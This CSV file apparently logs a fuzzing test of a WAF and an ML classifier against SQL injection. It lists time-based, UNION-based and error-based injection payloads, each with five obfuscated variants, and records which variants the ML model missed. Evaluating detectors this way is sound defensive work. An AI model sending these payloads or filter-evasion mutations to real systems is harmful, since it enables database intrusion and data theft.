Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T20:55:02.579516,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",403,403,200,waf_correct_ml_incorrect,"(SELECT 1)"" anD  AND 1   LIKE
  benchmark  (  ' '/**/LIKE ' ',md5  (  0x76555642   )    )   ",2024-12-16T20:55:06.675982,403,403,both_correct,"(SElECT 7382 iN (7381,(SeLEcT (SElECt 1)),7383))"" AnD  and 1   lIke	  benchmark  (  ' ' liKe ' ',md5  (  0x76555642   )    )   ",2024-12-16T20:55:12.259330,403,200,waf_correct_ml_incorrect,"(SElecT 7382 in ((SELECT 1),(sElect (sELEcT 1)),7383))"" anD  ANd 4844 IN (4843,4844,0x12ed)   lIke   benchmark  (  ' ' LikE ' ',md5  (  0x76555642   )    )  /**/",2024-12-16T20:55:19.419829,403,403,both_correct,"(SEleCT '6' LIKe '0x6' IN ((SEleCT 1),(sELect (SeLECt 1)),(SELECT 1)))"" anD  &&/**/4844 In (4843,4844,0x12ed)   LikE   benchmark  (  ' ' liKe ' ',md5  (  0x76555642  	)    )  /*:lO])*/",2024-12-16T20:55:28.945323,403,403,both_correct,"(sEleCT '6' like '0x6' In ((sELecT 7978 NOT LIKE 7979),(SElEct (SELeCT  oR 0)),(sEleCT 1)))"" ANd  &&/**/(SeLEcT 4844) in (4843,4844,0x12ed)   lIke   benchmark  (  ' ' like ' ',md5  (  0x76555642/**/ 
)    )  /*:lO])*/",2024-12-16T20:55:39.199841,403,200,waf_correct_ml_incorrect
2,2024-12-16T20:55:50.956460,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle",403,403,200,waf_correct_ml_incorrect,"1'   )    )     )   or char  (  68  )  ||char  (  (SELECT 69)  )  ||char  (  97  )  ||char  (   OR 0  )    =  regexp_substring 	(/**/ repeat  (  right  (  char  (  5389  )  ,0  )  ,6283 NOT LIKE 6284  )  ,null  )   and    (    (     (  'jhle' like 'jhle",2024-12-16T20:56:02.814629,403,200,waf_correct_ml_incorrect,"1'   )    )     )   or char  (  68  )  ||char  (  (SELECT 69)  )  ||char  (  97  )  ||char  (   OR 0  )    =  regexp_substring 	(  repeat  (  right  (  char  (   AND 1  )  ,8038 LIKE 8038  )  ,0x188b NOT LIKE 6284  )  ,null  )   and    (    (     (  'jhle'
like 'jhle",2024-12-16T20:56:16.365417,403,200,waf_correct_ml_incorrect,"(seLect 1)'   )    )   /**/ )   or char  (  '?M'!='?MU'  )  ||char  (  (SELECT 0x45)  )  ||char  (  97  )  ||char  (   OR 0  )    =  regexp_substring  (  repeat  (  right  (  char  (   AND 1  )  ,8038 LIKE 8038  )  ,0x188b NOT LIKE 6284  )  ,null  )   and    (    (     (  'jhle'
like 'jhle",2024-12-16T20:56:30.844098,403,403,both_correct,"(SeLEcT/**/6610!= AND 1)'   )    )   /**/ )   or char  (  '?M'!='?MU'  )  ||char  (  (SELECT 0x45)  )  ||char  (  97  )  ||char  (   OR 0  )    =  regexp_substring  (  repeat  (  right  (  char  (   AND 1  )  ,0x1f66 LIKE 8038  )  ,0x188b NOT LIKE 6284  )  ,null  )   and    (    (     (  'jhle' like 'jhle",2024-12-16T20:56:46.310821,403,403,both_correct,"(SELeCt 6610 NOT LIKE  anD 1)'   )    )   /**/ )   or char  (  '?M'!='?MU'  )  ||char  (  (SELECT 0x45)  )  ||char  (  97  )  ||char  (   OR 0  )    =  regexp_substring  (  repeat  (  right  (  char  (   AND  AND 1  )  ,0x1f66 LIKE (SELECT 8038)  )  ,0x188b NOT LIKE	'L' LIKE 'L'  )  ,null  )   and    (    (     (  'jhle' like 'jhle",2024-12-16T20:57:02.096906,403,403,both_correct
3,2024-12-16T20:57:18.836596,"1'  )   union all select null,null,null,null,null#",403,403,403,both_correct,"0x2632 not like (SELECT 1)'
 )  /*Gx*/union all SelEct null,null,null,null,null#",2024-12-16T20:57:21.338073,403,403,both_correct,"0x2632 not like (SELEcT (sElect  AND 2819 LIkE 2819))'	 )  /*Gx*/union/**/all SELEct null,null,null,null,null#h~",2024-12-16T20:57:26.216660,403,403,both_correct,"0x2632 not like (sElECt (selEct  ANd 0xb03 LIkE  OR 0))'	 )   union/**/all	selECT null,null,null,null,null#h~!~",2024-12-16T20:57:32.666410,403,200,waf_correct_ml_incorrect,"0x2632 not like (seLECt (seleCt  AND 0xb03 lIKE 
oR 'Y+'='Y+'))'	 )   union all	seLECT null,null,null,null,null#h~!~j",2024-12-16T20:57:39.277356,403,403,both_correct,"0x2632	not like (sEleCt (seleCt  aNd 0xb03 LIke 
Or 'Y+' LikE/**/'Y+'))'	 )   union all	SeLecT null,null,null,null,null#h~!~jZ^",2024-12-16T20:57:45.919254,403,403,both_correct
4,2024-12-16T20:57:52.989783,1'+  (  select naiw where 4924  =  4924,403,403,403,both_correct,(SELEcT 1)'+  (  seLeCT naiw/**/WHerE 4924 	 like   (seleCt 'Ppbu' LIKE 'Ppbu'),2024-12-16T20:57:54.967107,403,403,both_correct,"(selEcT (SelECt 1))'+  (  seLeCT naiw/**/WHerE 2133 NOT LIKE (SELECT 2134)/**/
 like   (seleCt 'Ppbu' LIKE 'Ppbu')",2024-12-16T20:57:59.800893,403,403,both_correct,(seLEct (SelECt (sElEct 0x1)))'+  (  seLeCT naiw/**/WHerE 2133 NOT LIKE (SELECT 7324=7324)/*JD/Oj*/	/**/like   (seleCt 'Ppbu' LIKE 'Ppbu'),2024-12-16T20:58:06.501878,403,403,both_correct,"(selecT (sELEcT (sElEct 0x1)))'+  (  seLeCT naiw/**/WHerE  AND 8427 LIKE 8427 NOT LIKE (SELECT 7324=(SELECT 7324))/*JD/Oj*/
 like   (seleCt 'Ppbu' LIKE 'Ppbu')",2024-12-16T20:58:13.981330,403,403,both_correct,"(SelEcT (seleCT (sElect 0x1)))'+  (  seLeCT naiw/**/WHerE/**/ AND (SELECT
5090 LIKE 5090) LIKE 8427 NOT LIKE (SELECT 7324=(SELECT  OR 0))/*JD/Oj*/
 like   (seleCt 'Ppbu' LIKE 'Ppbu')",2024-12-16T20:58:22.446174,403,403,both_correct
5,2024-12-16T20:58:32.411933,"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",403,403,403,both_correct,"1""   (  selecT   (  cAsE wheN   (  5451  =  (SELECT 1)  )  	THen regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  ) /**/,null  )   elsE char  (  108  )  ||char  (  (sElect 76)  )  ||char  (  112  )   OR char  (  3872 NOT LIKE 3873  )   ENd  )   fROM information_schema.system_users  )  ",2024-12-16T20:58:45.531024,403,403,both_correct,"1""   (  selECT   (  cAse When   (   OR 0  =  (sELect 1)  )  	Then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   ELSe char  (  0x6c  )  ||char  (  (SElecT 76)  )	 ||char  (  'P'='P'  )   oR char  (  3872 not like 3873  )   eND  )   FRom information_schema.system_users  )  ",2024-12-16T20:59:01.679098,403,403,both_correct,"(SELECT 1)""   (  sEleCt   (  Case WHeN   (   OR  aND 1  =  (SeleCt 1) 
)  	THEn regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,'2' LIKE '2'  )  ,500000000  )  ,null  )   eLSe char  (  0x6c  )  ||char  (  (seleCt 76)  )	 ||char  (  'P' like 'P'  )   or char  (  3872 not like 3873 /**/)   End  )   FroM information_schema.system_users  )  ",2024-12-16T20:59:17.593573,403,403,both_correct,"(SeleCT 'Y' like 'Y')""   (  Select   (  CaSE WHeN   (   or  aNd 1  =  (seLect 1) 	)  	Then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,'(SELECT 2)' lIKE '2'  )  , OR 0  )  ,null  )   elSe char  (  0x6c  )  ||char  (  (SeLECT 76)  )	 ||char  (  'P' LikE 'P'  )   oR char  (  3872/**/not like 3873 /**/)   End  )   fROM information_schema.system_users  )  ",2024-12-16T20:59:35.396326,403,403,both_correct,"(SeleCT 'Y' lIke 'Y')""   (  sElECT   ( /**/case When   (   Or  and
1  =  (SElEcT 1) 	)  	tHen regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,'(SELECT 2)' likE ''H'='H''  )  , or  Or 0  )  ,null  )   eLse char  (  0x6c  )   OR char  (  (selECt 0x4c)  )	 ||char  (  'P' LikE 'P'  )   Or char  (  3872/**/not like 3873 /*1w*/)   end  )   FroM information_schema.system_users  )  ",2024-12-16T20:59:54.053496,403,403,both_correct
6,2024-12-16T21:00:13.534767,"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",403,403,403,both_correct,"-8758' union all SEleCT 1575 like
0x627,6885,6885,6885,6885,6885,/*[=P*/or 0,6885--",2024-12-16T21:00:16.687712,403,403,both_correct,"-8758' union
all sELeCt  && 1 In (4511,4512,4513) liKE
0x627,(SELECT/**/6885),6885,6885,6885,6885,/**/or 0,6885--",2024-12-16T21:00:21.640620,403,403,both_correct,"-8758' union
all seLeCT   And  1 IN (4511,4512,6278<>6279) liKe 0x627,(sELecT (SelECT 1)),0x1ae5,6885,6885,6885,/**/Or 0,6885--",2024-12-16T21:00:28.035880,403,403,both_correct,"-8758' union
all SElecT   AND  1 iN (4511,4512,6278!=6279) LiKE 0x627,(sElect (seLeCT 	OR 0)),0x1ae5,(SELECT 6885),6885,6885, OR 0,7614<>7615--",2024-12-16T21:00:35.337143,403,403,both_correct,"-8758' union
all SElecT  /**/AND  1 iN (4511,4512,6278!= AND 1) LiKE 0x627,(sElect (seLeCT  || 0)),0x1ae5,(SELECT 6885),6885,'s?' LIKE 's?', oR 0,0x1dbe<>7615--",2024-12-16T21:00:43.037646,403,403,both_correct
7,2024-12-16T21:00:51.778902,"1  )   as qjjm where 3850  =  3850 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",403,403,403,both_correct,"1  )/*(W*/  AS qjjm wheRE (SelEcT 3850)  =  3850 or   (  SElECT 3926 In (3925,3926,3927) fRom  (  sELECT count  (  *  )  ,concat  (  0x7171706a71,  (  SELect 
 (  elt  (  9173   likE   (SElECT 1),1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FRoM information_schema.character_sets group by x  )  a  )  --",2024-12-16T21:01:05.532765,403,403,both_correct,"1  )/*(W*/  As qjjm wHeRE (selECt  && ',' lIke ',')  =  3850 or   (  sELEct 3926 In (3925,3926,0xf57) From  (  sElEcT count  (  *  )  ,concat  (  0x7171706a71,  (  SeLECt 
 (  elt  (  9173   liKE   (SeLect 1),1   )    )     )  ,0x717a767a71,floor  ( /**/rand  (
 0  )  *2   )    )   x fROm information_schema.character_sets group by x  )  a  )  --",2024-12-16T21:01:22.281750,403,200,waf_correct_ml_incorrect," OR 0  )/*(W*/  As qjjm wHeRE
(seLect  && ',' LIKE ',')  =  3850 OR   (  SELEct 3926 IN (2736 not like 2737,3926,0xf57) FRom  (  selecT count  (  *  )  ,concat  (  0x7171706a71,  (  seLect 
 (  elt  (  9173   lIkE   (SELect 1),1   )    )     )  ,0x717a767a71,floor  (  rand  (
 0  )  *0x2   )    )   x FrOm information_schema.character_sets group by x  )  a  )  --",2024-12-16T21:01:39.764554,403,403,both_correct," OR 0  )/*(W*/  as qjjm WHERe
(SeLEct  && ',' LIkE ',')   like   3850 Or   (  sEleCt 3926 iN (3978<>3979 not like 2737,0xf56,0xf57) froM
 (  sElect count  (  *  )  ,concat  (  0x7171706a71, /**/(  SEleCT 
 (  elt  (  9173   lIKe   (select  oR 0),1   )    )     )  ,0x717a767a71,floor  (  rand  (
 0  )  *0x2   )    )   x FROm information_schema.character_sets group by x  )  a  )  --",2024-12-16T21:01:57.979441,403,403,both_correct," OR (selEcT 0)  )/*(W*/  As qjjm wHerE
(SeleCt   ANd  ',' Like ',')   liKE   3850 or   (  seLect 3926 IN ((sELECT 'S'<>'Sz')<>3979 not like 2737,0xf56,0xf57) frOM
 (  sELEcT count  (  *  )  ,concat  ( 
0x7171706a71,  (  sELect 
 (  elt  (  9173   Like   (SElECT  or 0),1   )    )     )  ,0x717a767a71,floor  (  rand  (
 0  )  *0x2   )    )   x FROm information_schema.character_sets group by x  )  a  )  --",2024-12-16T21:02:17.178002,403,200,waf_correct_ml_incorrect
8,2024-12-16T21:02:37.199487,leocricia,200,200,200,both_correct,leocricia,2024-12-16T21:02:37.745742,200,200,both_correct,leocricia,2024-12-16T21:02:39.289919,200,200,both_correct,leocricia,2024-12-16T21:02:40.836639,200,200,both_correct,leocricia,2024-12-16T21:02:42.393236,200,200,both_correct,leocricia,2024-12-16T21:02:43.958953,200,200,both_correct
9,2024-12-16T21:02:45.508000,coe,200,200,403,waf_correct_ml_incorrect,coe,2024-12-16T21:02:45.786304,200,403,waf_correct_ml_incorrect,coe,2024-12-16T21:02:47.051041,200,403,waf_correct_ml_incorrect,coe,2024-12-16T21:02:48.333412,200,403,waf_correct_ml_incorrect,coe,2024-12-16T21:02:49.622638,200,403,waf_correct_ml_incorrect,coe,2024-12-16T21:02:50.910061,200,403,waf_correct_ml_incorrect
10,2024-12-16T21:02:52.172602,x' and 1  =    (  select count  (  *  )   from tabname  )  ,403,403,403,both_correct,x' AND 0x1	  LIKE     (  SeleCT count  ( /**/*  )   froM tabname  )  ,2024-12-16T21:02:54.936073,403,403,both_correct,x' && 0x1	 	lIKe     (  selEct count  (  *  )   fROM tabname  )  ,2024-12-16T21:02:59.180824,403,200,waf_correct_ml_incorrect,x'  and  0x1	 	LikE     (  selECT count	 (  */**/ )   fROm tabname  )  ,2024-12-16T21:03:03.289834,403,200,waf_correct_ml_incorrect,"x'  &&  0x1	 	LIke   
 (  SElect count	 ( /**/*/**/ )   From tabname  )  ",2024-12-16T21:03:07.736568,403,403,both_correct,"x'   ANd   0x1	 	Like   
 (  SeLEct count	 (  */**/ )   From tabname  )
 ",2024-12-16T21:03:12.343509,403,200,waf_correct_ml_incorrect
